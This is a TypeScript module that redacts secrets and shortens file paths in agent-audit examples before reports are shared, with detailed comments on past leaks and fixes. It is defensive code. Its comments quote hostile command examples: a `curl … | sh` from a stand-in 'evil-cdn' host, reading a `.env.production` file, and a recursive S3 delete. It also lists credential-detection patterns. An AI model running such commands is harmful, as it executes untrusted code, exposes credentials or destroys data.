/**
 * What an audit example looks like by the time it is allowed to leave the box.
 *
 * The audit keeps up to three 80-character examples per policy, and they are
 * slices of REAL commands and paths — `cat /home/sidd/work/acme/.env.production`,
 * `aws s3 rm s3://prod-bucket --recursive`. Naming what happened is the whole
 * value of the digest, and those strings are also the only thing in the report
 * that could carry something a person would mind sending.
 *
 * Three transforms, in this order, and the order matters:
 *
 *  1. **Secrets are masked**, against `SECRET_PATTERNS` — the same list the
 *     `sanitize-*` policies block on. One definition of "secret", used for both
 *     blocking and redacting, rather than a second pattern list beside it that
 *     eventually disagrees. A second pass then catches a secret that arrived
 *     ALREADY CUT: the audit truncates examples to 80 characters at capture
 *     time, so a command ending in a credential reaches this module with the
 *     credential's tail missing and the full pattern no longer matching. See
 *     `maskTruncatedSecret`.
 *  2. **Assigned secrets are masked** — `DATABASE_PASSWORD=hunter2`,
 *     `https://user:pass@host`, `curl -u user:pass`. These are shapes the
 *     BLOCKING patterns deliberately do not carry, because a name-based rule
 *     that denies a tool call would misfire on ordinary work. Redaction only
 *     removes characters, so it can afford the wider net. See
 *     `maskAssignedSecrets`.
 *  3. **Home paths are shortened**, so `/home/sidd/work/acme/src/db.ts` becomes
 *     `~/…/db.ts`. The basename is what makes a finding recognisable; the
 *     directory chain is a map of someone's disk and their employer's project
 *     names.
 *
 * Masking runs FIRST because shortening can cut a path mid-token, and a secret
 * embedded in a path (`.../ghp_xxxxx/...`) sliced in half stops matching its own
 * pattern and ships as a fragment.
 *
 * ## What this is not
 *
 * It is not a guarantee. Pattern-based redaction misses formats it has never
 * seen, and the honest framing is that this reduces exposure rather than
 * eliminating it — which is exactly why the digest carries counts and titles as
 * its substance and treats examples as colour. If the tradeoff ever stops being
 * worth it, `redactExample` is the one place to change.
 */
import { homedir } from "node:os";

import type { AuditResult } from "./types";

import { SECRET_PATTERNS } from "../hooks/builtin-policies";

/** Longest example we let through, after redaction. */
export const REDACTED_EXAMPLE_MAX_CHARS = 160;

/**
 * Path segments kept before the basename when shortening.
 *
 * Zero. `~/…/db.ts` says "somewhere under home" and names the file, which is
 * what makes a finding recognisable to the person who caused it. One segment
 * would routinely be the project — usually a client or employer name, and the
 * single most identifying token on the line.
 */
const KEPT_PARENT_SEGMENTS = 0;

/** Matches an absolute POSIX-ish path with at least two segments. */
const ABSOLUTE_PATH_RE = /(?:\/[\w.\-@+]+){2,}\/?/g;

/**
 * Roots whose paths are left intact.
 *
 * These are kernel and device paths — the same on every machine, identifying
 * nobody, and shortening them actively costs readability: a real digest came
 * back with `2>/…/null`, which reads as though something was hidden when
 * nothing was. Everything else is shortened, including paths outside home,
 * because "not under home" is not the same as "safe to send".
 */
const PUBLIC_PATH_ROOTS = ["/dev/", "/proc/", "/sys/"];

/**
 * Prefixes that BEGIN a secret, for catching one that arrives already cut.
 *
 * The audit truncates every example to 80 characters at capture time, long
 * before this module sees it — so a command ending in a credential arrives with
 * the credential's tail already gone, and the full patterns in
 * `SECRET_PATTERNS` no longer match it. A real digest came back containing
 * `authorization: Bearer s`, which is the first character of a live token.
 *
 * One character is not a usable secret. The point is that the number is set by
 * where the truncation happened to land rather than by anything here, and the
 * same shape with a longer prefix ships more. So a known prefix sitting at the
 * END of the string — with nothing after it, or too little to have matched — is
 * masked on the assumption it was cut, which costs a few characters of context
 * in the rare case it was not.
 *
 * Each prefix is guarded by `(?<!\w)` so it only fires at a token boundary.
 * Without it `sk-` matched INSIDE ordinary words — `kubectl get pods -n
 * risk-scoring` redacted to `… -n ri[REDACTED: OpenAI API key]`, which both
 * invents a credential the digest then reports and destroys the one token that
 * said which command ran. `task-`, `disk-` and `desk-` did the same.
 */
const SECRET_PREFIXES: ReadonlyArray<readonly [RegExp, string]> = [
  [/(?<!\w)(?:Authorization:\s*)?Bearer\s+\S*$/i, "bearer token"],
  [/(?<!\w)sk-ant-\S*$/, "Anthropic API key"],
  [/(?<!\w)sk-proj-\S*$/, "OpenAI project API key"],
  [/(?<!\w)sk-\S*$/, "OpenAI API key"],
  [/(?<!\w)ghp_\S*$/, "GitHub personal access token"],
  [/(?<!\w)github_pat_\S*$/, "GitHub fine-grained token"],
  [/(?<!\w)AKIA\S*$/, "AWS access key ID"],
  [/(?<!\w)sk_live_\S*$/, "Stripe live secret key"],
  [/(?<!\w)sk_test_\S*$/, "Stripe test secret key"],
  [/(?<!\w)AIza\S*$/, "Google API key"],
  [/-----BEGIN\s[A-Z ]*$/, "private key"],
];

/**
 * Mask a secret that was cut short before it reached us.
 *
 * Runs AFTER `maskSecrets`, so a complete secret is already gone and this only
 * ever sees a genuine fragment. Anchored to the end of the string, because a
 * prefix in the MIDDLE with text after it was not truncated — it either matched
 * a full pattern already or was never a secret.
 */
export function maskTruncatedSecret(input: string): string {
  for (const [pattern, label] of SECRET_PREFIXES) {
    if (pattern.test(input)) {
      return input.replace(pattern, `[REDACTED: ${label}]`);
    }
  }
  return input;
}

/**
 * Identifier fragments that make an assignment's VALUE a secret.
 *
 * Two lists, because the words differ in how much they mean on their own.
 * `TOKEN`, `SECRET` and `PASSWORD` name a credential wherever they appear in an
 * identifier, including the camelCase `_authToken` that `npm config set`
 * writes. `KEY`, `PASS`, `AUTH`, `PAT` and `SIG` are also fragments of ordinary
 * words — `MONKEY_COUNT`, `PASSENGERS`, `AUTHOR`, `PATH`, `SIGNAL` — so they
 * only count as a whole component, where the components come from
 * `identifierComponents` and include camelCase humps as well as `_`.
 */
const SECRET_NAME_SUBSTRINGS = [
  "TOKEN",
  "SECRET",
  "PASSWORD",
  "PASSWD",
  "PASSPHRASE",
  "CREDENTIAL",
  "APIKEY",
  "PRIVATEKEY",
];
const SECRET_NAME_COMPONENTS = ["KEY", "PASS", "AUTH", "PAT", "SIG", "SIGNATURE", "SESSION", "COOKIE"];

/**
 * `PWD` names a credential only in a COMPOUND identifier. `MYSQL_PWD` is
 * MySQL's documented password variable; a bare `PWD` is the shell's working
 * directory, which is on every second line of a captured session.
 */
const COMPOUND_ONLY_COMPONENTS = ["PWD"];

/**
 * Split an identifier into its uppercased components, on `_`, `-`, `.` AND
 * camelCase humps.
 *
 * The humps are the point. Splitting on `_` alone means `sessionKey`, `dbPass`,
 * `basicAuth` and `authCookie` decompose to a single component that matches
 * nothing, so their values shipped to the digest verbatim — 203 such names on
 * this machine's corpus. They are not exotic: camelCase is what an identifier
 * looks like everywhere except a shell environment, and the redactor is applied
 * to transcripts full of TypeScript, JSON and Python.
 *
 * The second replace splits an acronym from the word that follows it, so
 * `APIKey` yields `API` + `KEY` rather than one run of capitals that matches
 * neither.
 */
function identifierComponents(name: string): string[] {
  return name
    .replace(/([a-z0-9])([A-Z])/g, "$1_$2")
    .replace(/([A-Z]+)([A-Z][a-z])/g, "$1_$2")
    .toUpperCase()
    .split(/[_\-.]+/)
    .filter(Boolean);
}

/**
 * `NAME=value`, with the value quoted or running to the next shell separator.
 *
 * The unquoted alternative excludes quotes as well as separators: a value that
 * runs to end-of-token inside an already-quoted string (`"…?sig=deadbeef"`)
 * would otherwise swallow the closing quote and leave the line unbalanced.
 *
 * Four shapes, because the first spelling of this pattern was `NAME=value` and
 * only that — no whitespace around the `=`, no `:`, no quoted name — and the
 * other three all reached the emailed digest UNREDACTED. `NAME = "value"` and
 * `NAME: "value"` are what a config file, a YAML key and a JSON body look like,
 * which is most of where credentials are actually written down; `"name": val`
 * is the same line once an agent pretty-prints it. A value only survived that
 * gap if it independently matched one of the vendor patterns in
 * `SECRET_PATTERNS` — and 230 of 237 secret-named assignments measured across
 * this machine's transcripts match none of them, so the assignment rule was the
 * only thing standing between them and the digest.
 *
 * The separator is captured and re-emitted verbatim rather than normalised to
 * `=`, so a redacted YAML line is still YAML and a redacted JSON line is still
 * recognisable as the field it came from. Horizontal whitespace only: `\s`
 * would let a `KEY:` at end-of-line swallow the newline and glue the next line
 * onto the match.
 *
 * The `:` alternative refuses a `//` after it, because a URL scheme is the one
 * `name:value` shape that is not an assignment. Without the guard `https` reads
 * as the name and the rest of the URL as its value — and since a non-secret
 * name returns the match UNCHANGED but still CONSUMES it, a `?token=…` sitting
 * inside that URL was swallowed by the `https:` match and never examined. The
 * failure mode is silent and inverted: adding a separator to catch more secrets
 * stopped one already being caught.
 */
/**
 * The identifier is BOUNDED, and the bound is load-bearing rather than tidy.
 *
 * Unbounded (`[A-Za-z0-9_]*`), this is quadratic on a long unbroken token: the
 * engine starts at every one of n positions, consumes the whole run, then
 * backtracks a character at a time looking for the `=` or `:` that never comes.
 * Measured on a plain 300 KB base64 blob — `"A".repeat(300000)` — it ran for
 * over 20 SECONDS on one string. That is not an exotic input: agent transcripts
 * carry base64 images, minified bundles and whole file contents as single
 * lines, and the audit reads every one of them. A scheduled scan hitting a few
 * of these would stall for minutes with nobody watching.
 *
 * 128 characters is far past any real environment-variable or field name, so
 * bounding it costs nothing that exists and makes the scan linear in n.
 */
const ASSIGNMENT_RE =
  /(["']?)\b([A-Za-z_][A-Za-z0-9_]{0,127})\1([ \t]*(?::(?!\/\/)|=)[ \t]*)("[^"]*"|'[^']*'|[^\s;|&"']+)/g;

/** Credentials inline in a URL, on ANY scheme — `https://user:pass@host`. */
// Every quantifier here is BOUNDED, for the same reason ASSIGNMENT_RE's is.
// Unbounded, `[a-z0-9+.\-]*` is quadratic on any long lowercase run: at each of
// n positions it consumes to the end hunting for a `://` that is not there,
// then backtracks a character at a time. Measured at 18 SECONDS on 100 KB of a
// single repeated letter — and this one runs over the WHOLE text, on every
// example the audit redacts. A URI scheme is at most a few characters (RFC 3986
// allows more, but nothing real uses it), and userinfo that runs past 256 bytes
// is not a credential anyone typed.
const URL_CREDENTIALS_RE = /([a-z][a-z0-9+.\-]{0,31}:\/\/)[^\s/:@]{1,256}:[^\s/@]{1,256}@/gi;

/** `curl -u user:pass`, in both spellings and both separators. */
const BASIC_AUTH_FLAG_RE = /((?:^|\s)(?:-u|--user)[\s=])\S+:\S+/g;

/** True when an identifier's name says its value is a credential. */
/**
 * Prefixes whose values a build tool INLINES INTO THE BROWSER BUNDLE.
 *
 * These are not conventionally public, they are mechanically public: Next.js,
 * Vite, CRA, Expo, SvelteKit, Astro, Nuxt and Gatsby each substitute the value
 * into the JavaScript they ship to every visitor. A credential named this way
 * has already been published by the framework, to everyone, before failproofai
 * ever saw it.
 */
const CLIENT_BUNDLE_PREFIXES = [
  "NEXT_PUBLIC",
  "VITE",
  "REACT_APP",
  "EXPO_PUBLIC",
  "NUXT_PUBLIC",
  "GATSBY",
  "STORYBOOK",
  "PUBLIC",
];

/** Markers that name a key as the publishable half of a pair. */
const PUBLISHED_MARKERS = /PUBLISHABLE|(^|_)PUBLIC_KEY$|(^|_)ANON_KEY$/;

/**
 * True when the identifier says the value is meant to be public.
 *
 * `isSecretName` matches any component in `KEY`/`PASS`/`AUTH`/… — and EVERY
 * publishable key on earth is named `*_KEY`. Measured before this existed, it
 * returned true for all twelve of `NEXT_PUBLIC_STRIPE_PUBLISHABLE_KEY`,
 * `NEXT_PUBLIC_SUPABASE_ANON_KEY`, `VAPID_PUBLIC_KEY`, `PUBLISHABLE_KEY` and
 * friends — including the ones carrying the literal word PUBLIC.
 *
 * Over-redaction is usually cheap: masking something that might be secret costs
 * readability. This case is different, because we can PROVE the value is not a
 * secret — so masking it reports a credential exposure that did not happen, and
 * a security tool crying wolf about a browser-bundled config value is not a
 * cheap error. This repo's own committed PostHog `phc_` key, documented in
 * source as "Write-only (safe to commit)", is masked as an "assigned secret" by
 * the rule this vetoes.
 *
 * Deliberately narrow. The marker must be a PREFIX (so a mid-name `PUBLIC` in
 * `MY_PUBLIC_FACING_SECRET` does not disarm it) or an explicit publishable
 * suffix. Words like ANON, BROWSER and SITE are excluded on their own — only
 * `ANON_KEY`, which is Supabase's documented browser key, qualifies.
 */
export function isPublishedByDesign(name: string): boolean {
  const components = identifierComponents(name);
  if (components.length === 0) return false;
  const upper = components.join("_");
  for (const prefix of CLIENT_BUNDLE_PREFIXES) {
    if (upper === prefix || upper.startsWith(prefix + "_")) return true;
  }
  return PUBLISHED_MARKERS.test(upper);
}

export function isSecretName(name: string): boolean {
  // Runs first and beats every other signal: a value the framework compiles
  // into the browser bundle is public no matter what the rest of the name says.
  if (isPublishedByDesign(name)) return false;
  const upper = name.toUpperCase();
  if (SECRET_NAME_SUBSTRINGS.some((word) => upper.includes(word))) return true;
  const components = identifierComponents(name);
  if (components.some((part) => SECRET_NAME_COMPONENTS.includes(part))) return true;
  return components.length > 1 && components.some((part) => COMPOUND_ONLY_COMPONENTS.includes(part));
}

/**
 * Mask secrets whose shape is an ASSIGNMENT rather than a known vendor prefix.
 *
 * This is the one class the blocking patterns deliberately do not cover, and
 * the gap mattered because `protect-env-vars` is in the digest's harmful set
 * (`harm-report.ts`) and its dominant trigger is `export VAR=…` — so the
 * example is the whole command, value included. `SECRET_PATTERNS` matches nine
 * vendor-prefixed key formats, a JWT, a literal `Authorization: Bearer` and a
 * fixed non-HTTP scheme list; none of them matches
 * `export DATABASE_PASSWORD=hunter2-prod-acme`, and `export` is ubiquitous in
 * agent sessions. Every one of those shipped verbatim.
 *
 * These patterns live HERE rather than in `SECRET_PATTERNS` on purpose, and it
 * is not the "second list that eventually disagrees" this module warns about.
 * The two jobs have opposite error costs: the `sanitize-*` policies BLOCK a
 * tool call, so a false positive there is a denial of work the user wanted, and
 * a name-based rule would deny `export EDITOR=vim` on a machine with
 * `PASSTHROUGH` in the environment. Redaction only removes characters from a
 * digest, so it can afford to be generous, and being generous is the point. The
 * shared list stays the floor; this is the redactor spending its extra margin.
 *
 * The NAME is kept and only the value is masked — `DATABASE_PASSWORD=[REDACTED:
 * assigned secret]` still tells the reader which credential was exposed, which
 * is the actionable half of the finding.
 */
export function maskAssignedSecrets(input: string): string {
  let out = input.replace(
    ASSIGNMENT_RE,
    (match, quote: string, name: string, separator: string, value: string) => {
      if (!isSecretName(name)) return match;
      // An earlier pass already named this one, and it named it better.
      // `export ANTHROPIC_API_KEY=sk-ant-…` is masked by the vendor pattern as
      // "Anthropic API key"; re-masking it here would downgrade that to the
      // generic label and strip the marker's own tail as it went.
      if (value.startsWith("[REDACTED")) return match;
      return `${quote}${name}${quote}${separator}[REDACTED: assigned secret]`;
    },
  );
  out = out.replace(URL_CREDENTIALS_RE, "$1[REDACTED: URL credentials]@");
  out = out.replace(BASIC_AUTH_FLAG_RE, "$1[REDACTED: basic auth]");
  return out;
}

/**
 * Mask anything matching a known secret shape.
 *
 * A fresh `RegExp` is built per pattern per call rather than reusing the shared
 * literal with the `g` flag added: a global regex carries `lastIndex` across
 * calls, so a shared instance would skip matches in the next string depending on
 * where it stopped in the previous one — a bug that only appears once there is
 * more than one example, and looks like flakiness rather than logic.
 */
export function maskSecrets(input: string): string {
  let out = input;
  for (const [pattern, label] of SECRET_PATTERNS) {
    const global = new RegExp(pattern.source, pattern.flags.includes("g") ? pattern.flags : `${pattern.flags}g`);
    out = out.replace(global, `[REDACTED: ${label}]`);
  }
  return out;
}

/**
 * Replace absolute paths with `~/…/<basename>`.
 *
 * The home directory is resolved rather than assumed, and a path outside it is
 * shortened too — `/etc/…/shadow`, `/var/…/secrets.yml` — because "not under
 * home" is not the same as "safe to send", and a build agent's checkout lives
 * under `/build` as often as anywhere.
 */
export function shortenPaths(input: string, home = homedir()): string {
  // Normalised ONCE, not per match: `startsWith` against a home carrying a
  // trailing slash fails for the home directory itself (`/home/u` does not start
  // with `/home/u/`), which silently turned off home detection for the one path
  // that most needed it.
  const homeRoot = home.replace(/\/+$/, "");
  return input.replace(ABSOLUTE_PATH_RE, (match, offset: number, whole: string) => {
    // Kernel/device paths are the same on every machine and identify nobody.
    if (PUBLIC_PATH_ROOTS.some((root) => match.startsWith(root))) return match;

    // A URL's HOST is not a directory, and it was being deleted as one.
    //
    // `curl https://evil-cdn.example.com/install.sh | sh` came out as
    // `curl https:/…/install.sh` — the domain is the entire security decision
    // in a `block-curl-pipe-sh` finding, and it was the one token removed. The
    // match begins at the second slash of `://`, so the scheme is checked
    // behind it and the host kept while the path is still shortened.
    if (offset > 0 && whole[offset - 1] === "/" && /[a-z][a-z0-9+.\-]*:$/i.test(whole.slice(0, offset - 1))) {
      const urlSegments = match.split("/").filter(Boolean);
      if (urlSegments.length <= 1) return match;
      const host = urlSegments[0];
      const leaf = urlSegments[urlSegments.length - 1];
      const elided = urlSegments.length > 2 ? "/…" : "";
      return `/${host}${elided}/${leaf}${match.endsWith("/") ? "/" : ""}`;
    }
    const trailingSlash = match.endsWith("/");
    const segments = match.split("/").filter(Boolean);
    if (segments.length === 0) return match;
    const basename = segments[segments.length - 1];
    const kept = segments.slice(
      Math.max(0, segments.length - 1 - KEPT_PARENT_SEGMENTS),
      segments.length - 1,
    );
    // `/home/u2` starts with `/home/u` as a string and is a different directory,
    // so the boundary is checked rather than the prefix alone.
    const matchRoot = match.replace(/\/+$/, "");
    const underHome =
      homeRoot.length > 0 && (matchRoot === homeRoot || matchRoot.startsWith(`${homeRoot}/`));

    // The home directory ITSELF is `~`, and nothing more.
    //
    // Without this, `/home/sidd` shortened to `~/…/sidd` — the username kept as
    // the basename, immediately after the `~` whose entire job is to stand in
    // for it. The one path guaranteed to name a person was the one the redactor
    // spelled out, and it shipped to the server and into the digest. `~/` for a
    // trailing slash, so `cd /home/sidd/` still reads as a directory.
    if (matchRoot === homeRoot && homeRoot.length > 0) {
      return trailingSlash ? "~/" : "~";
    }
    const root = underHome ? "~" : "";
    // `…` rather than `...` so the elision cannot be mistaken for a relative
    // path component, and reads as one glyph in a monospace digest.
    const middle = segments.length - kept.length - 1 > 0 ? "/…" : "";
    const tail = [...kept, basename].join("/");
    return `${root}${middle}/${tail}${trailingSlash ? "/" : ""}`;
  });
}

/**
 * Full pipeline: mask, shorten, collapse whitespace, cap.
 *
 * Whitespace is collapsed because a heredoc or a multi-line command reaches the
 * digest as one row, and a raw newline there breaks the plain-text layout while
 * saying nothing the single line does not.
 */
/**
 * Mask every secret, and nothing else.
 *
 * The three masking passes of `redactExample` without the path shortening, the
 * whitespace collapse or the length cap. This is what a LOCAL renderer wants:
 * on your own machine your own paths are the useful half of an example, and
 * `~/…/db.ts` costs readability for no gain — nobody is protected from their own
 * directory names. A credential on screen is the other half of that trade: it is
 * one screenshot, one pasted issue or one screen-share away from being published,
 * and unlike the path it can never be un-leaked.
 *
 * So the split is deliberate: everything that LEAVES the machine goes through
 * `redactExample`; the terminal gets this.
 */
export function maskSecretsOnly(input: string): string {
  return maskAssignedSecrets(maskTruncatedSecret(maskSecrets(input)));
}

export function redactExample(input: string, home = homedir()): string {
  // Assignment masking runs LAST of the three, so the two pattern-based passes
  // get first refusal on anything they can name precisely. A vendor prefix
  // yields "[REDACTED: Anthropic API key]"; falling through to this one would
  // have said only "assigned secret", which is true but less useful to read.
  const masked = maskSecretsOnly(input);
  const shortened = shortenPaths(masked, home);
  const collapsed = shortened.replace(/\s+/g, " ").trim();
  return collapsed.length > REDACTED_EXAMPLE_MAX_CHARS
    ? `${collapsed.slice(0, REDACTED_EXAMPLE_MAX_CHARS - 1)}…`
    : collapsed;
}

/**
 * Redact every free-text field of an `AuditResult` that could carry a secret or
 * name someone's disk.
 *
 * The counts, titles, timestamps and policy names are the substance of a report
 * and none of them come from user data. What DOES come from user data is the
 * example strings (slices of real commands), the per-example `cwd`, and the
 * project lists — which are the same three things `redactExample` was written
 * for, applied to the whole structure instead of one row.
 *
 * Used by every renderer that produces an artifact which can travel:
 * `formatMarkdown` (the file the CLI calls a "Shareable report") and
 * `formatJson` (whatever the caller pipes it into). The emailed digest reaches
 * the same guarantee by a different route — `harm-report.ts` redacts each
 * example as it selects it, because it also has to apply the reporting window.
 *
 * Returns a NEW object. The caller's result is left alone, so the dashboard and
 * the cache keep the unredacted values they need to render a local view.
 */
export function redactAuditResult(result: AuditResult, home = homedir()): AuditResult {
  // Built field by field ON PURPOSE. This was `{...result}` plus three named
  // rewrites, which meant it was a FIELD ALLOWLIST pretending to be a redactor:
  // every field it did not name — including any field added later — passed
  // through byte-identical, absolute home paths and all. It guards
  // `formatJson`, i.e. an artifact the product invites the user to share.
  //
  // Enumerating every key means TypeScript rejects the build when `AuditResult`
  // grows a field nobody decided about here, which is the only mechanism that
  // survives a future contributor. `redactAuditResultKeys` in the tests reflects
  // over the real object and fails if this list drifts, covering the case where
  // a field is added as optional and the compiler stays quiet.
  const redacted: AuditResult = {
    // Scalars and counters: no paths, no user content, nothing to redact.
    version: result.version,
    scannedAt: result.scannedAt,
    transcripts: result.transcripts,
    totals: result.totals,
    eventsScanned: result.eventsScanned,
    enabledBuiltinNames: result.enabledBuiltinNames,
    // Salted, machine-local ids. They carry no path and cannot be reversed to
    // a credential, so they pass through — but the decision is recorded here
    // rather than inherited from a spread.
    newLeakIds: result.newLeakIds,

    // Everything below carries a path or user content and is rewritten.
    scope: {
      cli: result.scope.cli,
      since: result.scope.since,
      projects: result.scope.projects === "all"
        ? "all"
        : result.scope.projects.map((p) => shortenPaths(p, home)),
    },
    results: result.results.map((row) => ({
      ...row,
      examples: row.examples.map((e) => ({
        ...e,
        example: redactExample(e.example, home),
        cwd: shortenPaths(e.cwd, home),
      })),
    })),
    projectsScanned: result.projectsScanned.map((p) => shortenPaths(p, home)),
  };
  return redacted;
}

/**
 * Every top-level key `redactAuditResult` has consciously handled.
 *
 * The compiler catches a REQUIRED field added to `AuditResult`, because the
 * object literal above would stop satisfying the type. It does not catch an
 * OPTIONAL one — and the leak record is arriving as optional fields. So the
 * test reflects over a real result and fails when a key appears here that is
 * not in this list, which forces the decision to be made rather than defaulted.
 */
export const REDACTED_AUDIT_RESULT_KEYS: ReadonlyArray<keyof AuditResult> = [
  "version",
  "scannedAt",
  "scope",
  "transcripts",
  "results",
  "totals",
  "projectsScanned",
  "eventsScanned",
  "enabledBuiltinNames",
  "newLeakIds",
];
